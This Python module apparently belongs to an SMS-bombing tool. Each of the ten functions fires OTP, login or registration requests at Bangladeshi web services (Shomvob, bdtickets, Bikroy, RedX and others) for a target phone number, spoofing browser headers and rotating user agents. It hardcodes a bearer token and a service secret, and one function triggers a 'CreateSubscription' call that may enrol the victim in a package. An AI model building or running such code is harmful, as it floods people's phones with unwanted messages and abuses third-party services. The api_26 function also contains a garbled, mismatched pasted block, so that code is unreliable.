import requests
from .utils import send_request, get_random_user_agent

def api_21(number):
    url = "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0"
    headers = {
        "Accept-Encoding": "gzip",
        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "backend-api.shomvob.co",
        "User-Agent": get_random_user_agent()
    }
    data = {"phone": f"88{number}"}
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("code") == 200 and json_data.get("msg") == "SUCCESS":
                return response
            else:
                print(f"api_21 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_21 Validation Error: {e}")

    return response

def api_22(number):
    url = "https://backend.timezonebd.com/api/v1/user/otp-login"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    data = {"phone": number}
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("data") and json_data.get("data").get("phone") == number:
                 # Check for 'id' or 'phone' in data to confirm success
                return response
            elif json_data.get("data") and json_data.get("data").get("id"):
                 return response
            else:
                print(f"api_22 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_22 Validation Error: {e}")

    return response

def api_23(number):
    url = "https://api.bdtickets.com:20100/v1/auth"
    headers = {
        "Host": "api.bdtickets.com:20100",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Origin": "https://bdtickets.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://bdtickets.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1,"
    }
    data = {"createUserCheck": True, "phoneNumber": f"+88{number}", "applicationChannel": "WEB_APP"}
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("message") == "OTP_GENERATED":
                return response
            else:
                print(f"api_23 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_23 Validation Error: {e}")

    return response

def api_24(number):
    url = "https://api.chardike.com/api/otp/send"
    headers = {
        "Host": "api.chardike.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "User-Agent": get_random_user_agent(),
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Accept": "*/*",
        "Origin": "https://chardike.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://chardike.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i",
        "Connection": "keep-alive"
    }
    data = {"phone": number, "otp_type": "login"}
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("result") is True:
                return response
            else:
                print(f"api_24 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_24 Validation Error: {e}")

    return response

def api_25(number):
    url = "https://bb-api.bohubrihi.com/public/activity/otp"
    headers = {
        "Host": "bb-api.bohubrihi.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Authorization": "Bearer undefined",
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Origin": "https://bohubrihi.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://bohubrihi.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    data = {"phone": number, "intent": "login"}
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("body") and json_data.get("body").get("token"):
                return response
            else:
                print(f"api_25 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_25 Validation Error: {e}")

    return response

def api_26(number):
    url = "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web"
    headers = {
        "Host": "api.deeptoplay.com",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Authorization": "",
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json",
        "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
        "Content-Type": "application/json",
        "Sec-Ch-Ua-Mobile": "?0",
        "Origin": "https://www.deeptoplay.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.deeptoplay.com/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=1, i"
    }
    data = {"number": f"+880{number[1:] if number.startswith('0') else number}"}
    response = send_request(url, "POST", headers, data)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("success") is True:
                return response
            else:
                print(f"api_26 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_26 Validation Error: {e}")

    response = send_request(url, "POST", headers, json_data)
    
    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("ResponseCode") == "0027":
                return response
            else:
                print(f"api_29 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_29 Validation Error: {e}")

    return response

def api_27(number):
    url = "https://api.win2gain.com/api/Users/RequestOtp"
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'cache-control': 'no-cache',
        'client': '0',
        'dnt': '1',
        'expires': '0',
        'origin': 'https://win2gain.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://win2gain.com/',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'sourceplatform': 'web',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
    }

    params = {
        'msisdn': f'88{number}' if not number.startswith('88') else number,
        'otpEvent': 'SignUp',
    }

    response = send_request(url, "GET", headers, params=params)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("status") == 200 and json_data.get("message") == "Information saved successfully":
                return response
            else:
                print(f"api_27 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_27 Validation Error: {e}")

    return response

def api_28(number):
    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={number}"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "application-name": "web",
        "sec-ch-ua-platform": "\"Android\"",
        "accept-language": "en",
        "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
        "sec-ch-ua-mobile": "?1",
        "dnt": "1",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://bikroy.com/en/users/login?action=my-account&redirect-url=%2Fen%2Fmy%2Fdashboard",
        "priority": "u=1, i"
    }
    response = send_request(url, "GET", headers)

    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("otp_length") == 6:
                return response
            else:
                print(f"api_28 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_28 Validation Error: {e}")

    return response

def api_29(number):
    url = "https://api.toybox.live/bdapps_handler.php"
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DNT': '1',
        'Origin': 'https://bd.toybox.live',
        'Referer': 'https://bd.toybox.live/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'Operation': 'CreateSubscription',
        'MobileNumber': f'88{number}' if not number.startswith('88') else number,
        'PackageID': 100,
        'Secret': 'HJKX71%UHYHa',
    }

    response = send_request(url, "POST", headers, json_data)
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("ResponseCode") == "0027":
                return response
            else:
                print(f"api_29 Validation Failed: {json_data}")
                response.status_code = 400
                return response
    except Exception as e:
        print(f"api_29 Validation Error: {e}")

    return response

def api_30(number):
    url = 'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp'
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://redx.com.bd',
        'priority': 'u=1, i',
        'referer': 'https://redx.com.bd/',
        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    }

    data = {
        'phoneNumber': number,
    }

    response = send_request(url, "POST", headers, data)
    
    # Response Validation
    try:
        if response and response.status_code == 200:
            json_data = response.json()
            if json_data.get("isError") is False and "Otp has been sent" in json_data.get("message", ""):
                return response
            else:
                print(f"api_30 Validation Failed: {json_data}")
                if response: response.status_code = 400
                return response
    except Exception as e:
        print(f"api_30 Validation Error: {e}")

    return response
